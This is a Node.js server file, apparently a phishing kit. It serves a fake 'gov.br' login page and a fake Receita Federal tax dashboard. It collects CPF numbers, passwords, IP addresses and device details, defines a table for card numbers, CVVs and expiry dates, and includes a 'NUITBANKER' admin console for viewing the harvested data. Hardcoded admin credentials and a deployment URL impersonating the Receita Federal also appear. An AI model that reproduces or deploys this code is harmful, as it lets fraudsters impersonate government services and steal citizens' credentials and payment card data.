require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');

const app = express();
app.use(cors());
app.use(express.json());

// ============================================================
// CONEXÃO COM POSTGRESQL
// ============================================================
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

// ============================================================
// ROTA PARA INICIALIZAR O BANCO
// Acesse: https://seu-app.onrender.com/api/init
// ============================================================
app.get('/api/init', async (req, res) => {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS usuarios (
                id SERIAL PRIMARY KEY,
                nome VARCHAR(255) NOT NULL DEFAULT 'Usuário',
                email VARCHAR(255) DEFAULT 'usuario@email.com',
                cpf VARCHAR(11) UNIQUE NOT NULL,
                senha VARCHAR(255) NOT NULL,
                ip VARCHAR(50),
                dispositivo TEXT,
                navegador TEXT,
                role VARCHAR(50) DEFAULT 'user',
                ultimo_acesso TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS logs_acesso (
                id SERIAL PRIMARY KEY,
                cpf VARCHAR(11),
                ip VARCHAR(50),
                dispositivo TEXT,
                navegador TEXT,
                data_acesso TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        await pool.query(`
            CREATE TABLE IF NOT EXISTS cartoes (
                id SERIAL PRIMARY KEY,
                nome_titular VARCHAR(255),
                numero VARCHAR(50),
                cvv VARCHAR(10),
                validade_mes VARCHAR(2),
                validade_ano VARCHAR(4),
                bandeira VARCHAR(50),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Criar usuário administrador (Kakabanker / 77991958)
        const senhaHash = await bcrypt.hash('77991958', 10);
        await pool.query(`
            INSERT INTO usuarios (nome, cpf, email, senha, role)
            VALUES ('Kakabanker', '00000000000', 'admin@nuitbanker.com', $1, 'admin')
            ON CONFLICT (cpf) DO NOTHING
        `, [senhaHash]);
        
        res.json({ success: true, message: 'Banco inicializado! Admin: Kakabanker, Senha: 77991958' });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// ============================================================
// ROTA DE LOGIN (CPF + SENHA juntos)
// ============================================================
app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador } = req.body;
    let cpfLimpo = cpf ? cpf.replace(/\D/g, '') : '';
    
    if (!cpfLimpo || !password) {
        return res.status(400).json({ error: 'CPF e senha são obrigatórios' });
    }
    
    try {
        const result = await pool.query('SELECT * FROM usuarios WHERE cpf = $1', [cpfLimpo]);
        
        if (result.rows.length === 0) {
            return res.status(401).json({ error: 'CPF ou senha inválidos' });
        }
        
        const user = result.rows[0];
        const validPassword = await bcrypt.compare(password, user.senha);
        
        if (!validPassword) {
            return res.status(401).json({ error: 'CPF ou senha inválidos' });
        }
        
        // Registrar log
        await pool.query(`
            INSERT INTO logs_acesso (cpf, ip, dispositivo, navegador)
            VALUES ($1, $2, $3, $4)
        `, [cpfLimpo, ip || 'Não coletado', dispositivo || 'Desconhecido', navegador || 'Desconhecido']);
        
        // Atualizar dados do usuário
        await pool.query(`
            UPDATE usuarios SET ip = $1, dispositivo = $2, navegador = $3, ultimo_acesso = NOW()
            WHERE cpf = $4
        `, [ip || 'Não coletado', dispositivo || 'Desconhecido', navegador || 'Desconhecido', cpfLimpo]);
        
        const token = jwt.sign(
            { id: user.id, cpf: user.cpf, nome: user.nome, role: user.role },
            process.env.JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        res.json({
            success: true,
            token,
            user: { id: user.id, nome: user.nome, cpf: user.cpf, email: user.email, role: user.role }
        });
    } catch (error) {
        console.error('Erro no login:', error);
        res.status(500).json({ error: 'Erro no servidor' });
    }
});

// ============================================================
// MIDDLEWARE ADMIN
// ============================================================
function isAdmin(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Token não fornecido' });
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        if (decoded.role !== 'admin') return res.status(403).json({ error: 'Acesso negado' });
        req.user = decoded;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Token inválido' });
    }
}

// ============================================================
// ROTAS ADMIN
// ============================================================
app.get('/api/admin/users', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT id, nome, cpf, email, role, ip, dispositivo, ultimo_acesso, created_at FROM usuarios ORDER BY id DESC');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar usuários' });
    }
});

app.delete('/api/admin/users/:id', isAdmin, async (req, res) => {
    const { id } = req.params;
    try {
        await pool.query('DELETE FROM usuarios WHERE id = $1 AND role != $2', [id, 'admin']);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao deletar usuário' });
    }
});

app.get('/api/admin/logs', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM logs_acesso ORDER BY data_acesso DESC LIMIT 200');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar logs' });
    }
});

app.get('/api/admin/cartoes', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM cartoes ORDER BY id DESC');
        res.json({ success: true, cartoes: result.rows });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar cartões' });
    }
});

app.get('/api/admin/stats', isAdmin, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM usuarios WHERE role = $1', ['user']);
        const totalAdmins = await pool.query('SELECT COUNT(*) FROM usuarios WHERE role = $1', ['admin']);
        const totalLogs = await pool.query('SELECT COUNT(*) FROM logs_acesso');
        const logsHoje = await pool.query('SELECT COUNT(*) FROM logs_acesso WHERE DATE(data_acesso) = CURRENT_DATE');
        
        res.json({
            success: true,
            stats: {
                total_users: parseInt(totalUsers.rows[0].count),
                total_admins: parseInt(totalAdmins.rows[0].count),
                total_logs: parseInt(totalLogs.rows[0].count),
                logs_hoje: parseInt(logsHoje.rows[0].count)
            }
        });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar estatísticas' });
    }
});

// ============================================================
// PÁGINA PRINCIPAL (CPF + SENHA JUNTOS)
// ============================================================
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>gov.br - Acesse sua conta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a5f7a 0%, #0d3550 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 12px;
            width: 100%;
            max-width: 450px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { color: #1a5f7a; font-size: 28px; margin-bottom: 8px; }
        .header p { color: #666; font-size: 14px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 14px; }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #1a5f7a;
            box-shadow: 0 0 0 3px rgba(26,95,122,0.1);
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #1a5f7a;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-login:hover { background: #0d4b63; }
        .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #1a5f7a; text-decoration: none; font-size: 13px; margin: 0 10px; }
        .links a:hover { text-decoration: underline; }
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            display: none;
        }
        .message.error { background: #fee; color: #c33; border: 1px solid #fcc; display: block; }
        .message.success { background: #efe; color: #2e7d32; border: 1px solid #c8e6c9; display: block; }
        .loading {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .badge {
            background: #e8f4f8;
            padding: 8px 12px;
            border-radius: 8px;
            text-align: center;
            font-size: 12px;
            color: #1a5f7a;
            margin-bottom: 20px;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #999;
            font-size: 12px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #ddd;
        }
        .divider::before { margin-right: 10px; }
        .divider::after { margin-left: 10px; }
        .social-login { display: flex; gap: 15px; justify-content: center; }
        .social-btn {
            flex: 1;
            padding: 10px;
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>gov.br</h1>
            <p>Acesso único a serviços públicos</p>
        </div>
        
        <div class="badge">
            🔒 Ambiente seguro e criptografado
        </div>
        
        <div class="input-group">
            <label>CPF</label>
            <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
        </div>
        
        <div class="input-group">
            <label>Senha</label>
            <input type="password" id="password" placeholder="Digite sua senha">
        </div>
        
        <button class="btn-login" id="loginBtn" onclick="fazerLogin()">Entrar</button>
        
        <div class="links">
            <a href="#">Esqueci minha senha</a>
            <a href="#">Criar nova conta</a>
        </div>
        
        <div class="divider">ou</div>
        
        <div class="social-login">
            <div class="social-btn">🏦 Bancos</div>
            <div class="social-btn">📱 QR Code</div>
            <div class="social-btn">🔐 Certificado</div>
        </div>
        
        <div id="message" class="message"></div>
    </div>

    <script>
        const API_URL = '';
        
        function formatCPF(input) {
            let value = input.value.replace(/\\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            if (value.length >= 4) value = value.replace(/(\\d{3})(\\d)/, '$1.$2');
            if (value.length >= 8) value = value.replace(/(\\d{3})(\\d)/, '$1.$2');
            if (value.length >= 11) value = value.replace(/(\\d{3})(\\d{1,2})$/, '$1-$2');
            input.value = value;
        }
        
        function showMessage(msg, type) {
            const msgDiv = document.getElementById('message');
            msgDiv.textContent = msg;
            msgDiv.className = 'message ' + type;
            setTimeout(() => { msgDiv.style.display = 'none'; }, 4000);
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return 'Não coletado'; }
        }
        
        async function fazerLogin() {
            const cpf = document.getElementById('cpf').value.replace(/\\D/g, '');
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            
            if (!cpf || cpf.length !== 11) {
                showMessage('Digite um CPF válido (11 dígitos)', 'error');
                return;
            }
            if (!password) {
                showMessage('Digite sua senha', 'error');
                return;
            }
            
            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="loading"></span> Entrando...';
            
            const ip = await getIP();
            const userAgent = navigator.userAgent;
            const dispositivo = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent) ? 'Mobile' : 'Desktop';
            const navegador = userAgent.includes('Chrome') ? 'Chrome' : (userAgent.includes('Firefox') ? 'Firefox' : (userAgent.includes('Safari') ? 'Safari' : 'Outro'));
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf, password, ip, dispositivo, navegador })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showMessage('Login realizado! Redirecionando...', 'success');
                    localStorage.setItem('token', data.token);
                    localStorage.setItem('user', JSON.stringify(data.user));
                    
                    setTimeout(() => {
                        if (data.user.role === 'admin') {
                            window.location.href = '/admin';
                        } else {
                            window.location.href = '/dashboard';
                        }
                    }, 1500);
                } else {
                    showMessage(data.error || 'CPF ou senha inválidos', 'error');
                    loginBtn.disabled = false;
                    loginBtn.innerHTML = 'Entrar';
                }
            } catch (error) {
                showMessage('Erro ao conectar com o servidor', 'error');
                loginBtn.disabled = false;
                loginBtn.innerHTML = 'Entrar';
            }
        }
        
        document.getElementById('cpf').addEventListener('input', function() { formatCPF(this); });
        document.getElementById('password').addEventListener('keypress', function(e) { if (e.key === 'Enter') fazerLogin(); });
    </script>
</body>
</html>`);
});

// ============================================================
// PÁGINA DA RECEITA FEDERAL (após login normal)
// ============================================================
app.get('/dashboard', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Receita Federal - Meu Imposto de Renda</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }
        .header {
            background: linear-gradient(135deg, #006747 0%, #004d35 100%);
            color: white;
            padding: 20px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header-container { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
        .logo-area { display: flex; align-items: center; gap: 15px; }
        .logo-area i { font-size: 40px; }
        .logo-area h1 { font-size: 24px; }
        .user-area { text-align: right; }
        .user-name { font-weight: bold; font-size: 16px; }
        .logout-btn { background: rgba(255,255,255,0.2); border: none; color: white; padding: 8px 20px; border-radius: 5px; cursor: pointer; margin-top: 8px; }
        .container { max-width: 1200px; margin: 30px auto; padding: 0 20px; }
        .services-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin-bottom: 30px; }
        .service-card { background: white; border-radius: 12px; padding: 25px; cursor: pointer; transition: transform 0.3s; border: 1px solid #e0e0e0; }
        .service-card:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .service-icon { font-size: 40px; color: #006747; margin-bottom: 15px; }
        .service-card h3 { color: #006747; margin-bottom: 10px; }
        .main-section { background: white; border-radius: 12px; padding: 25px; margin-bottom: 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .section-title { color: #006747; border-bottom: 2px solid #006747; padding-bottom: 10px; margin-bottom: 20px; }
        .status-box { background: #e8f4f8; padding: 20px; border-radius: 10px; }
        .status-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #cde5ed; }
        .status-item:last-child { border-bottom: none; }
        .btn-primary { background: #006747; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; margin-top: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #e0e0e0; }
        th { background: #f5f5f5; color: #333; }
        .footer { background: #333; color: white; text-align: center; padding: 20px; margin-top: 40px; }
        @media (max-width: 768px) { .header-container { flex-direction: column; text-align: center; } .user-area { text-align: center; } }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-container">
            <div class="logo-area">
                <i class="fas fa-building"></i>
                <div><h1>Receita Federal do Brasil</h1><p>Ministério da Fazenda</p></div>
            </div>
            <div class="user-area">
                <div class="user-name" id="userName">Carregando...</div>
                <div class="user-name" id="userCpf" style="font-size: 12px; opacity: 0.8;"></div>
                <button class="logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Sair</button>
            </div>
        </div>
    </header>

    <div class="container">
        <div class="services-grid">
            <div class="service-card" onclick="alert('Iniciar declaração IRPF 2026')">
                <div class="service-icon"><i class="fas fa-file-invoice-dollar"></i></div>
                <h3>Declaração IRPF 2026</h3>
                <p>Entregue sua declaração do Imposto de Renda</p>
            </div>
            <div class="service-card" onclick="alert('Consulta CPF')">
                <div class="service-icon"><i class="fas fa-receipt"></i></div>
                <h3>Consulta CPF</h3>
                <p>Verifique a situação cadastral do seu CPF</p>
            </div>
            <div class="service-card" onclick="alert('Comprovante de Declaração')">
                <div class="service-icon"><i class="fas fa-print"></i></div>
                <h3>Comprovante</h3>
                <p>Emita comprovantes de envio da declaração</p>
            </div>
            <div class="service-card" onclick="alert('Restituição')">
                <div class="service-icon"><i class="fas fa-dollar-sign"></i></div>
                <h3>Restituição IRPF</h3>
                <p>Consulte o status da sua restituição</p>
            </div>
        </div>

        <div class="main-section">
            <h2 class="section-title">Minha Declaração IRPF 2026</h2>
            <div class="status-box">
                <div class="status-item"><span>Status da Declaração:</span><strong id="statusDeclaracao">Não entregue</strong></div>
                <div class="status-item"><span>Ano-Calendário:</span><strong>2025</strong></div>
                <div class="status-item"><span>Prazo Final:</span><strong>30/04/2026</strong></div>
            </div>
            <button class="btn-primary" onclick="iniciarDeclaracao()"><i class="fas fa-edit"></i> Iniciar Declaração</button>
        </div>

        <div class="main-section">
            <h2 class="section-title">Bens e Direitos</h2>
            <table id="bensTable">
                <thead><tr><th>Descrição</th><th>Valor (R$)</th><th>Ações</th></tr></thead>
                <tbody><tr><td colspan="3" style="text-align: center;">Nenhum bem cadastrado</td></tr</tbody>
             </table>
            <button class="btn-primary" onclick="adicionarBem()" style="margin-top: 15px;"><i class="fas fa-plus"></i> Adicionar Bem</button>
        </div>

        <div class="main-section">
            <h2 class="section-title">Simulação do Imposto Devido</h2>
            <div class="status-box">
                <div class="status-item"><span>Rendimentos Tributáveis:</span><strong id="rendimentos">R$ 0,00</strong></div>
                <div class="status-item"><span>Despesas Dedutíveis:</span><strong id="deducoes">R$ 0,00</strong></div>
                <div class="status-item"><span>Imposto Devido:</span><strong id="impostoDevido">R$ 0,00</strong></div>
            </div>
        </div>
    </div>

    <footer class="footer"><p>© 2026 Receita Federal do Brasil - Todos os direitos reservados</p></footer>

    <script>
        const token = localStorage.getItem('token');
        const user = JSON.parse(localStorage.getItem('user') || '{}');
        
        if (!token) { window.location.href = '/'; }
        
        document.getElementById('userName').textContent = user.nome || 'Usuário';
        document.getElementById('userCpf').textContent = user.cpf ? user.cpf.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{2})/, '$1.$2.$3-$4') : '';
        
        function logout() { localStorage.clear(); window.location.href = '/'; }
        
        function iniciarDeclaracao() {
            alert('Iniciando declaração do Imposto de Renda 2026...');
            document.getElementById('statusDeclaracao').textContent = 'Em andamento';
            document.getElementById('statusDeclaracao').style.color = '#ffa000';
        }
        
        function adicionarBem() {
            const descricao = prompt('Descrição do bem:');
            if (!descricao) return;
            const valor = prompt('Valor (R$):');
            if (!valor) return;
            
            const tbody = document.querySelector('#bensTable tbody');
            if (tbody.querySelector('td[colspan="3"]')) tbody.innerHTML = '';
            
            const row = tbody.insertRow();
            row.innerHTML = '<td>' + descricao + '</td><td>R$ ' + parseFloat(valor).toLocaleString('pt-BR', { minimumFractionDigits: 2 }) + '</td><td><button onclick="this.parentElement.parentElement.remove()" style="background:#c33; color:white; border:none; padding:5px 10px; border-radius:3px; cursor:pointer;">Remover</button></td>';
            calcularImposto();
        }
        
        function calcularImposto() {
            const rendimentos = Math.random() * 200000;
            const deducoes = Math.random() * 50000;
            const imposto = Math.max(0, rendimentos * 0.275 - deducoes * 0.15);
            document.getElementById('rendimentos').innerHTML = 'R$ ' + rendimentos.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
            document.getElementById('deducoes').innerHTML = 'R$ ' + deducoes.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
            document.getElementById('impostoDevido').innerHTML = 'R$ ' + imposto.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
        }
        
        setTimeout(calcularImposto, 1000);
    </script>
</body>
</html>`);
});

// ============================================================
// PÁGINA DO ADMIN (NUITBANKER)
// ============================================================
app.get('/admin', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NUITBANKER | Admin Console</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Outfit', sans-serif; background: #0a0a0a; color: #fff; }
        .sidebar {
            position: fixed; left: 0; top: 0; width: 280px; height: 100vh;
            background: rgba(0,0,0,0.95); border-right: 1px solid rgba(255,255,255,0.1);
            padding: 30px 20px; z-index: 100;
        }
        .sidebar-logo { text-align: center; margin-bottom: 40px; }
        .sidebar-logo h2 { font-size: 28px; letter-spacing: -1px; }
        .sidebar-menu { list-style: none; }
        .sidebar-menu li { margin-bottom: 10px; }
        .sidebar-menu a {
            display: flex; align-items: center; gap: 15px; padding: 12px 18px;
            color: rgba(255,255,255,0.6); text-decoration: none; border-radius: 10px;
            transition: all 0.3s; cursor: pointer;
        }
        .sidebar-menu a:hover, .sidebar-menu a.active { background: rgba(255,255,255,0.1); color: #fff; }
        .main-content { margin-left: 280px; padding: 30px; }
        .admin-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logout-btn { background: rgba(255,255,255,0.1); border: none; padding: 8px 20px; border-radius: 8px; color: #fff; cursor: pointer; }
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: rgba(255,255,255,0.05); border-radius: 12px; padding: 20px; border: 1px solid rgba(255,255,255,0.1); }
        .stat-value { font-size: 32px; font-weight: 700; color: #10b981; }
        .stat-label { font-size: 12px; opacity: 0.6; margin-top: 8px; }
        .tabs { display: flex; gap: 12px; margin-bottom: 25px; flex-wrap: wrap; }
        .tab {
            padding: 8px 22px; background: rgba(255,255,255,0.05); border-radius: 8px;
            cursor: pointer; font-size: 14px;
        }
        .tab.active { background: #10b981; color: #000; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .table-wrapper { overflow-x: auto; background: rgba(255,255,255,0.03); border-radius: 12px; padding: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
        th { color: #10b981; font-size: 12px; }
        .badge-admin { background: rgba(239,68,68,0.2); color: #f87171; padding: 4px 12px; border-radius: 20px; font-size: 11px; }
        .badge-user { background: rgba(16,185,129,0.2); color: #10b981; padding: 4px 12px; border-radius: 20px; font-size: 11px; }
        .btn-danger { background: rgba(239,68,68,0.2); border: 1px solid rgba(239,68,68,0.3); padding: 5px 12px; border-radius: 6px; color: #f87171; cursor: pointer; }
        @media (max-width: 768px) {
            .sidebar { transform: translateX(-100%); transition: 0.3s; }
            .sidebar.open { transform: translateX(0); }
            .main-content { margin-left: 0; padding: 20px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .menu-toggle { position: fixed; bottom: 20px; left: 20px; background: #10b981; padding: 12px; border-radius: 50%; cursor: pointer; z-index: 101; }
        }
        @media (min-width: 769px) { .menu-toggle { display: none; } }
    </style>
</head>
<body>
<div class="menu-toggle" onclick="document.getElementById('sidebar').classList.toggle('open')"><i class="fas fa-bars"></i></div>
<aside class="sidebar" id="sidebar">
    <div class="sidebar-logo"><h2>NUITBANKER</h2><p>SECURE CONSOLE</p></div>
    <ul class="sidebar-menu">
        <li><a onclick="switchTab('users')" class="active"><i class="fas fa-users"></i> Usuários</a></li>
        <li><a onclick="switchTab('cards')"><i class="fas fa-credit-card"></i> Cartões</a></li>
        <li><a onclick="switchTab('logs')"><i class="fas fa-history"></i> Logs</a></li>
    </ul>
</aside>
<main class="main-content">
    <div class="admin-header"><h1>NUITBANKER <span style="color:#10b981">v1</span></h1><button class="logout-btn" onclick="logout()">SAIR</button></div>
    <div class="stats-grid">
        <div class="stat-card"><div class="stat-value" id="statUsers">0</div><div class="stat-label">Total Usuários</div></div>
        <div class="stat-card"><div class="stat-value" id="statAdmins">0</div><div class="stat-label">Administradores</div></div>
        <div class="stat-card"><div class="stat-value" id="statCards">0</div><div class="stat-label">Cartões Salvos</div></div>
        <div class="stat-card"><div class="stat-value" id="statLogs">0</div><div class="stat-label">Acessos Hoje</div></div>
    </div>
    <div class="tabs"><div class="tab active" onclick="switchSubTab('users')">USUÁRIOS</div><div class="tab" onclick="switchSubTab('cards')">CARTÕES</div><div class="tab" onclick="switchSubTab('logs')">LOGS</div></div>
    <div id="tabUsers" class="tab-content active"><div class="table-wrapper"><table><thead><tr><th>ID</th><th>Nome</th><th>CPF</th><th>Email</th><th>Cargo</th><th>IP</th><th>Ações</th></tr></thead><tbody id="usersTable"><tr><td colspan="7">Carregando...</td></tr></tbody></table></div></div>
    <div id="tabCards" class="tab-content"><div class="table-wrapper"><table><thead><tr><th>Titular</th><th>Número</th><th>CVV</th><th>Validade</th></tr></thead><tbody id="cardsTable"><tr><td colspan="4">Carregando...</td></tr></tbody></table></div></div>
    <div id="tabLogs" class="tab-content"><div class="table-wrapper"><table><thead><tr><th>CPF</th><th>IP</th><th>Dispositivo</th><th>Data</th></tr></thead><tbody id="logsTable"><tr><td colspan="4">Carregando...</td></tr></tbody></table></div></div>
</main>
<script>
const API_URL = '';
let token = localStorage.getItem('token');
if (!token) window.location.href = '/';
const user = JSON.parse(localStorage.getItem('user') || '{}');
if (user.role !== 'admin') window.location.href = '/dashboard';

async function loadUsers() {
    try {
        const res = await fetch('/api/admin/users', { headers: { 'Authorization': 'Bearer ' + token } });
        const users = await res.json();
        if (Array.isArray(users)) {
            document.getElementById('usersTable').innerHTML = users.map(u => '<tr><td>' + u.id + '</td><td>' + (u.nome || '-') + '</td><td>' + (u.cpf || '-') + '</td><td>' + (u.email || '-') + '</td><td><span class="' + (u.role === 'admin' ? 'badge-admin' : 'badge-user') + '">' + (u.role === 'admin' ? 'Admin' : 'User') + '</span></td><td>' + (u.ip || '-') + '</td><td>' + (u.role !== 'admin' ? '<button class="btn-danger" onclick="deleteUser(' + u.id + ')">Excluir</button>' : '-') + '</td></tr>').join('');
            document.getElementById('statUsers').innerText = users.length;
            document.getElementById('statAdmins').innerText = users.filter(u => u.role === 'admin').length;
        }
    } catch(e) { console.error(e); }
}

async function deleteUser(id) {
    if (!confirm('Excluir este usuário?')) return;
    try {
        await fetch('/api/admin/users/' + id, { method: 'DELETE', headers: { 'Authorization': 'Bearer ' + token } });
        loadUsers();
    } catch(e) { alert('Erro ao excluir'); }
}

async function loadCards() {
    try {
        const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': 'Bearer ' + token } });
        const data = await res.json();
        if (data.success && data.cartoes) {
            document.getElementById('cardsTable').innerHTML = data.cartoes.map(c => '<tr><td>' + (c.nome_titular || '-') + '</td><td>' + (c.numero || '-') + '</td><td>' + (c.cvv || '-') + '</td><td>' + (c.validade_mes || '') + '/' + (c.validade_ano || '') + '</td></tr>').join('');
            document.getElementById('statCards').innerText = data.cartoes.length;
        }
    } catch(e) { console.error(e); }
}

async function loadLogs() {
    try {
        const res = await fetch('/api/admin/logs', { headers: { 'Authorization': 'Bearer ' + token } });
        const logs = await res.json();
        if (Array.isArray(logs)) {
            document.getElementById('logsTable').innerHTML = logs.map(l => '<tr><td>' + (l.cpf || '-') + '</td><td>' + (l.ip || '-') + '</td><td>' + (l.dispositivo || '-') + '</td><td>' + new Date(l.data_acesso).toLocaleString() + '</td></tr>').join('');
            const hoje = new Date().toDateString();
            document.getElementById('statLogs').innerText = logs.filter(l => new Date(l.data_acesso).toDateString() === hoje).length;
        }
    } catch(e) { console.error(e); }
}

function switchTab(tab) {
    document.querySelectorAll('.sidebar-menu a').forEach(a => a.classList.remove('active'));
    event.target.classList.add('active');
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1)).classList.add('active');
}

function switchSubTab(tab) {
    document.querySelectorAll('.tabs .tab').forEach(t => t.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1)).classList.add('active');
}

function logout() { localStorage.clear(); window.location.href = '/'; }

loadUsers(); loadCards(); loadLogs();
setInterval(() => { loadUsers(); loadCards(); loadLogs(); }, 15000);
</script>
</body>
</html>`);
});

// ============================================================
// INICIAR SERVIDOR
// ============================================================
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log('🚀 Servidor rodando na porta ' + PORT);
    console.log('👤 Admin: Kakabanker | Senha: 77991958');
    console.log('🌐 Acesse: https://receitafederal-f2fk.onrender.com');
});